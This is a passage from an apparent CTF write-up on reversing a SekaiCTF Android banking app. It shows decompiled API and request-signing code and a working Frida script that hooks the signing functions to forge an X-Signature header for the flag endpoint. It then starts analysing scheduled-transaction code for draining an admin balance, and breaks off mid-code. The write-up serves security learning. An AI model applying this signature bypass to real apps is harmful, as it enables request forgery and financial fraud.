    <span class="nd">@POST</span><span class="o">(</span><span class="s">"flag"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">getFlag</span><span class="o">(</span><span class="nd">@Body</span> <span class="nc">FlagRequest</span> <span class="n">flagRequest</span><span class="o">);</span>

    <span class="nd">@GET</span><span class="o">(</span><span class="s">"user/profile"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">User</span><span class="o">&gt;&gt;</span> <span class="nf">getProfile</span><span class="o">();</span>

    <span class="nd">@GET</span><span class="o">(</span><span class="s">"transactions/recent"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">List</span><span class="o">&lt;</span><span class="nc">Transaction</span><span class="o">&gt;&gt;&gt;</span> <span class="nf">getRecentTransactions</span><span class="o">();</span>

    <span class="nd">@GET</span><span class="o">(</span><span class="s">"transactions/{id}"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">Transaction</span><span class="o">&gt;&gt;</span> <span class="nf">getTransaction</span><span class="o">(</span><span class="nd">@Path</span><span class="o">(</span><span class="s">"id"</span><span class="o">)</span> <span class="nc">String</span> <span class="n">str</span><span class="o">);</span>

    <span class="nd">@GET</span><span class="o">(</span><span class="s">"transactions"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">List</span><span class="o">&lt;</span><span class="nc">Transaction</span><span class="o">&gt;&gt;&gt;</span> <span class="nf">getTransactions</span><span class="o">(</span><span class="nd">@Query</span><span class="o">(</span><span class="s">"page"</span><span class="o">)</span> <span class="kt">int</span> <span class="n">i</span><span class="o">,</span> <span class="nd">@Query</span><span class="o">(</span><span class="s">"limit"</span><span class="o">)</span> <span class="kt">int</span> <span class="n">i2</span><span class="o">);</span>

    <span class="nd">@GET</span><span class="o">(</span><span class="s">"user/profile"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">User</span><span class="o">&gt;&gt;</span> <span class="nf">getUserProfile</span><span class="o">();</span>

    <span class="nd">@GET</span><span class="o">(</span><span class="s">"health"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">HealthResponse</span><span class="o">&gt;&gt;</span> <span class="nf">healthCheck</span><span class="o">();</span>

    <span class="nd">@POST</span><span class="o">(</span><span class="s">"auth/login"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">AuthResponse</span><span class="o">&gt;&gt;</span> <span class="nf">login</span><span class="o">(</span><span class="nd">@Body</span> <span class="nc">LoginRequest</span> <span class="n">loginRequest</span><span class="o">);</span>

    <span class="nd">@POST</span><span class="o">(</span><span class="s">"auth/logout"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">Void</span><span class="o">&gt;&gt;</span> <span class="nf">logout</span><span class="o">();</span>

    <span class="nd">@POST</span><span class="o">(</span><span class="s">"auth/refresh"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">AuthResponse</span><span class="o">&gt;&gt;</span> <span class="nf">refreshToken</span><span class="o">(</span><span class="nd">@Body</span> <span class="nc">RefreshTokenRequest</span> <span class="n">refreshTokenRequest</span><span class="o">);</span>

    <span class="nd">@POST</span><span class="o">(</span><span class="s">"auth/register"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">AuthResponse</span><span class="o">&gt;&gt;</span> <span class="nf">register</span><span class="o">(</span><span class="nd">@Body</span> <span class="nc">RegisterRequest</span> <span class="n">registerRequest</span><span class="o">);</span>

    <span class="nd">@POST</span><span class="o">(</span><span class="s">"transactions/send"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">Transaction</span><span class="o">&gt;&gt;</span> <span class="nf">sendMoney</span><span class="o">(</span><span class="nd">@Body</span> <span class="nc">SendMoneyRequest</span> <span class="n">sendMoneyRequest</span><span class="o">);</span>

    <span class="nd">@POST</span><span class="o">(</span><span class="s">"auth/pin/setup"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">Void</span><span class="o">&gt;&gt;</span> <span class="nf">setupPin</span><span class="o">(</span><span class="nd">@Body</span> <span class="nc">PinRequest</span> <span class="n">pinRequest</span><span class="o">);</span>

    <span class="nd">@POST</span><span class="o">(</span><span class="s">"auth/pin/verify"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">Void</span><span class="o">&gt;&gt;</span> <span class="nf">verifyPin</span><span class="o">(</span><span class="nd">@Body</span> <span class="nc">PinRequest</span> <span class="n">pinRequest</span><span class="o">);</span>
</pre></td></tr></tbody></table></code></div></div>
<p>we can find the apiService: there are a lot of routers like api/auth/login, api/auth/logout and api/flag. it means we have to send a request to api/flag router to get the flag</p>

<p><a href="/assets/img/2025/sekaiCTF/2.png" class="popup img-link  shimmer"><img src="/assets/img/2025/sekaiCTF/2.png" alt="" loading="lazy"></a></p>

<p>after i intercepted an http packet then tried tosend a request to /api/flag but the error is displayed with an “invalid signature” so i decided to find out what the x-signature header is about</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>        <span class="kd">public</span> <span class="nc">Response</span> <span class="nf">intercept</span><span class="o">(</span><span class="nc">Interceptor</span><span class="o">.</span><span class="na">Chain</span> <span class="n">chain</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
            <span class="nc">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="n">chain</span><span class="o">.</span><span class="na">request</span><span class="o">();</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="k">return</span> <span class="n">chain</span><span class="o">.</span><span class="na">proceed</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">newBuilder</span><span class="o">().</span><span class="na">header</span><span class="o">(</span><span class="s">"X-Signature"</span><span class="o">,</span> <span class="n">generateSignature</span><span class="o">(</span><span class="n">request</span><span class="o">)).</span><span class="na">build</span><span class="o">());</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="nc">ApiClient</span><span class="o">.</span><span class="na">TAG</span><span class="o">,</span> <span class="s">"Failed to generate signature: "</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
                <span class="k">return</span> <span class="n">chain</span><span class="o">.</span><span class="na">proceed</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>when i searched with the jadx, i found the snippet shown above, and i figured out how the x-signature header is generated: via the generateSignature() method</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre>        <span class="kd">private</span> <span class="nc">String</span> <span class="nf">generateSignature</span><span class="o">(</span><span class="nc">Request</span> <span class="n">request</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">GeneralSecurityException</span> <span class="o">{</span>
            <span class="nc">Signature</span><span class="o">[]</span> <span class="n">signatureArr</span><span class="o">;</span>
            <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">method</span><span class="o">()</span> <span class="o">+</span> <span class="s">"/api"</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="n">getEndpointPath</span><span class="o">(</span><span class="n">request</span><span class="o">))</span> <span class="o">+</span> <span class="n">getRequestBodyAsString</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
            <span class="nc">SekaiApplication</span> <span class="n">sekaiApplication</span> <span class="o">=</span> <span class="nc">SekaiApplication</span><span class="o">.</span><span class="na">getInstance</span><span class="o">();</span>
            <span class="nc">PackageManager</span> <span class="n">packageManager</span> <span class="o">=</span> <span class="n">sekaiApplication</span><span class="o">.</span><span class="na">getPackageManager</span><span class="o">();</span>
            <span class="nc">String</span> <span class="n">packageName</span> <span class="o">=</span> <span class="n">sekaiApplication</span><span class="o">.</span><span class="na">getPackageName</span><span class="o">();</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="nc">Build</span><span class="o">.</span><span class="na">VERSION</span><span class="o">.</span><span class="na">SDK_INT</span> <span class="o">&gt;=</span> <span class="mi">28</span><span class="o">)</span> <span class="o">{</span>
                    <span class="nc">PackageInfo</span> <span class="n">packageInfo</span> <span class="o">=</span> <span class="n">packageManager</span><span class="o">.</span><span class="na">getPackageInfo</span><span class="o">(</span><span class="n">packageName</span><span class="o">,</span> <span class="mi">134217728</span><span class="o">);</span>
                    <span class="nc">SigningInfo</span> <span class="n">signingInfo</span> <span class="o">=</span> <span class="n">packageInfo</span><span class="o">.</span><span class="na">signingInfo</span><span class="o">;</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">signingInfo</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">if</span> <span class="o">(</span><span class="n">signingInfo</span><span class="o">.</span><span class="na">hasMultipleSigners</span><span class="o">())</span> <span class="o">{</span>
                            <span class="n">signatureArr</span> <span class="o">=</span> <span class="n">signingInfo</span><span class="o">.</span><span class="na">getApkContentsSigners</span><span class="o">();</span>
                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                            <span class="n">signatureArr</span> <span class="o">=</span> <span class="n">signingInfo</span><span class="o">.</span><span class="na">getSigningCertificateHistory</span><span class="o">();</span>
                        <span class="o">}</span>
                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                        <span class="n">signatureArr</span> <span class="o">=</span> <span class="n">packageInfo</span><span class="o">.</span><span class="na">signatures</span><span class="o">;</span>
                    <span class="o">}</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="n">signatureArr</span> <span class="o">=</span> <span class="n">packageManager</span><span class="o">.</span><span class="na">getPackageInfo</span><span class="o">(</span><span class="n">packageName</span><span class="o">,</span> <span class="mi">64</span><span class="o">).</span><span class="na">signatures</span><span class="o">;</span>
                <span class="o">}</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">signatureArr</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">signatureArr</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                    <span class="nc">MessageDigest</span> <span class="n">messageDigest</span> <span class="o">=</span> <span class="nc">MessageDigest</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"SHA-256"</span><span class="o">);</span>
                    <span class="k">for</span> <span class="o">(</span><span class="nc">Signature</span> <span class="n">signature</span> <span class="o">:</span> <span class="n">signatureArr</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">messageDigest</span><span class="o">.</span><span class="na">update</span><span class="o">(</span><span class="n">signature</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
                    <span class="o">}</span>
                    <span class="k">return</span> <span class="nf">calculateHMAC</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="n">messageDigest</span><span class="o">.</span><span class="na">digest</span><span class="o">());</span>
                <span class="o">}</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">GeneralSecurityException</span><span class="o">(</span><span class="s">"No app signature found"</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">PackageManager</span><span class="o">.</span><span class="na">NameNotFoundException</span> <span class="o">|</span> <span class="nc">NoSuchAlgorithmException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">GeneralSecurityException</span><span class="o">(</span><span class="s">"Unable to extract app signature"</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>generateSignature() generates the x-signature in 2 steps, in two steps. first, it generates a message digest using SHA-256 with signatureArr. second, it creates the x-signature by calling the calculateHMAC() method</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre><span class="nx">Java</span><span class="p">.</span><span class="nf">perform</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">SigInterceptor</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">"</span><span class="s2">com.sekai.bank.network.ApiClient$SignatureInterceptor</span><span class="dl">"</span><span class="p">);</span>

    <span class="nx">SigInterceptor</span><span class="p">.</span><span class="nx">generateSignature</span><span class="p">.</span><span class="nf">overload</span><span class="p">(</span><span class="dl">'</span><span class="s1">okhttp3.Request</span><span class="dl">'</span><span class="p">).</span><span class="nx">implementation</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[*] Hooked generateSignature()</span><span class="dl">"</span><span class="p">);</span>

        <span class="k">try</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span>
            <span class="kd">var</span> <span class="nx">method</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nf">method</span><span class="p">();</span>
            <span class="kd">var</span> <span class="nx">endpointPath</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getEndpointPath</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>

            <span class="kd">var</span> <span class="nx">bodyStr</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getRequestBodyAsString</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
            <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="nx">method</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/api</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">endpointPath</span> <span class="o">+</span> <span class="nx">bodyStr</span><span class="p">;</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">  str = </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">str</span><span class="p">);</span>

        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">  [error reconstructing str] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">e</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="kd">var</span> <span class="nx">ret</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">generateSignature</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">  Signature = </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">ret</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
    <span class="p">};</span>
<span class="p">});</span>


<span class="nx">Java</span><span class="p">.</span><span class="nf">perform</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">Req</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">okhttp3.Request</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">Req</span><span class="p">.</span><span class="nx">method</span><span class="p">.</span><span class="nf">overload</span><span class="p">().</span><span class="nx">implementation</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">;</span> <span class="p">};</span>

    <span class="kd">var</span> <span class="nx">Sig</span> <span class="o">=</span> <span class="nx">Java</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">com.sekai.bank.network.ApiClient$SignatureInterceptor</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">Sig</span><span class="p">.</span><span class="nx">getEndpointPath</span><span class="p">.</span><span class="nf">overload</span><span class="p">(</span><span class="dl">'</span><span class="s1">okhttp3.Request</span><span class="dl">'</span><span class="p">).</span><span class="nx">implementation</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">;</span> <span class="p">};</span>
    <span class="nx">Sig</span><span class="p">.</span><span class="nx">getRequestBodyAsString</span><span class="p">.</span><span class="nf">overload</span><span class="p">(</span><span class="dl">'</span><span class="s1">okhttp3.Request</span><span class="dl">'</span><span class="p">).</span><span class="nx">implementation</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="dl">'</span><span class="s1">{</span><span class="se">\</span><span class="s1">"unmask_flag</span><span class="se">\</span><span class="s1">":true}</span><span class="dl">'</span><span class="p">;</span> <span class="p">};</span>

    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">[*] Only values fixed (signature calc). Remember: actual request is unchanged!</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>
<p>so we should hook the three functions called method(), getEndpointPath(), getRequestBodyAsString() to make to always return the values we intended</p>

<p><a href="/assets/img/2025/sekaiCTF/3.png" class="popup img-link  shimmer"><img src="/assets/img/2025/sekaiCTF/3.png" alt="" loading="lazy"></a></p>

<p>when i just click any button in this application, x-signature is always printed</p>

<p><a href="/assets/img/2025/sekaiCTF/4.png" class="popup img-link  shimmer"><img src="/assets/img/2025/sekaiCTF/4.png" alt="" loading="lazy"></a></p>

<p>then just send a request to /api/flag  with the x-signature</p>

<hr />
<h2 id="transaction"><span class="me-2">Transaction</span><a href="#transaction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="during-ctf"><span class="me-2">During CTF</span><a href="#during-ctf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>after i solved the signature chall, i wanted to solve this one but i couldn’t solve but actually i clearly approached to the way to solve. anyway i didn’t know or i just didn’t even try to think how to chain or what to chain. first of all, we should have drained admin balance to solve (1M usd)</p>

<p><a href="/assets/img/2025/sekaiCTF/5.png" class="popup img-link  shimmer"><img src="/assets/img/2025/sekaiCTF/5.png" alt="" loading="lazy"></a></p>

<p>using the “send money” function, we can transfer money to others. if we click the “schedule for later” button, we can schedule the transfer instead. when i found this logic, i searched for the code snippet that implements it</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>        <span class="nt">&lt;receiver</span>
            <span class="na">android:name=</span><span class="s">"com.sekai.bank.utils.delayed_transaction.DelayedTransactionReceiver"</span>
            <span class="na">android:exported=</span><span class="s">"false"</span><span class="nt">/&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>i could find the DelayedTransactionReceiver in Manifest.xml</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>    <span class="nd">@Override</span> <span class="c1">// android.content.BroadcastReceiver</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="no">TAG</span><span class="o">,</span> <span class="s">"Alarm triggered - processing delayed transactions"</span><span class="o">);</span>
        <span class="nc">DelayedTransactionManager</span><span class="o">.</span><span class="na">processReadyTransactions</span><span class="o">(</span><span class="n">context</span><span class="o">);</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the DelayedTransactionReceiver seems to process transactions through the processReadyTransactions() method</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">processReadyTransactions</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="no">TAG</span><span class="o">,</span> <span class="s">"Processing ready transactions..."</span><span class="o">);</span>
        <span class="nc">DelayedTransactionManager</span> <span class="n">delayedTransactionManager</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DelayedTransactionManager</span><span class="o">(</span><span class="n">context</span><span class="o">);</span>
        <span class="nc">List</span><span class="o">&lt;</span><span class="nc">DelayedTransaction</span><span class="o">&gt;</span> <span class="n">readyTransactions</span> <span class="o">=</span> <span class="n">delayedTransactionManager</span><span class="o">.</span><span class="na">storage</span><span class="o">.</span><span class="na">getReadyTransactions</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">readyTransactions</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
            <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="no">TAG</span><span class="o">,</span> <span class="s">"No ready transactions found"</span><span class="o">);</span>
            <span class="n">delayedTransactionManager</span><span class="o">.</span><span class="na">checkAndStopPeriodicCheckingIfNoTransactions</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="no">TAG</span><span class="o">,</span> <span class="s">"Found "</span> <span class="o">+</span> <span class="n">readyTransactions</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">+</span> <span class="s">" ready transactions"</span><span class="o">);</span>
            <span class="nc">Iterator</span><span class="o">&lt;</span><span class="nc">DelayedTransaction</span><span class="o">&gt;</span> <span class="n">it</span> <span class="o">=</span> <span class="n">readyTransactions</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">delayedTransactionManager</span><span class="o">.</span><span class="na">processTransaction</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">next</span><span class="o">());</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the processReadyTransactions() method will fetch all transactions that are already ready then process them so we can expect that it will be called when a scheduled transaction reaches its scheduled time</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>    <span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">DelayedTransaction</span><span class="o">&gt;</span> <span class="nf">getReadyTransactions</span><span class="o">()</span> <span class="o">{</span>
        <span class="nc">List</span><span class="o">&lt;</span><span class="nc">DelayedTransaction</span><span class="o">&gt;</span> <span class="n">allTransactions</span> <span class="o">=</span> <span class="n">getAllTransactions</span><span class="o">();</span>
        <span class="nc">ArrayList</span> <span class="n">arrayList</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">();</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">DelayedTransaction</span> <span class="n">delayedTransaction</span> <span class="o">:</span> <span class="n">allTransactions</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">delayedTransaction</span><span class="o">.</span><span class="na">isReadyToProcess</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">arrayList</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">delayedTransaction</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="no">TAG</span><span class="o">,</span> <span class="s">"Found "</span> <span class="o">+</span> <span class="n">arrayList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">+</span> <span class="s">" ready transactions"</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">arrayList</span><span class="o">;</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>all transactions are fetched via the getReadyTransactions() method which internally calls the getAllTransactions() method</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre>    <span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">DelayedTransaction</span><span class="o">&gt;</span> <span class="nf">getAllTransactions</span><span class="o">()</span> <span class="o">{</span>
        <span class="nc">File</span><span class="o">[]</span> <span class="n">transactionFiles</span><span class="o">;</span>
        <span class="nc">ArrayList</span> <span class="n">arrayList</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">storageDir</span><span class="o">.</span><span class="na">exists</span><span class="o">()</span> <span class="o">||</span> <span class="o">(</span><span class="n">transactionFiles</span> <span class="o">=</span> <span class="n">getTransactionFiles</span><span class="o">())</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">arrayList</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">File</span> <span class="n">file</span> <span class="o">:</span> <span class="n">transactionFiles</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">DelayedTransaction</span> <span class="n">readTransactionFromFile</span> <span class="o">=</span> <span class="n">readTransactionFromFile</span><span class="o">(</span><span class="n">file</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">readTransactionFromFile</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">arrayList</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">readTransactionFromFile</span><span class="o">);</span>
            <span class="o">}</span>
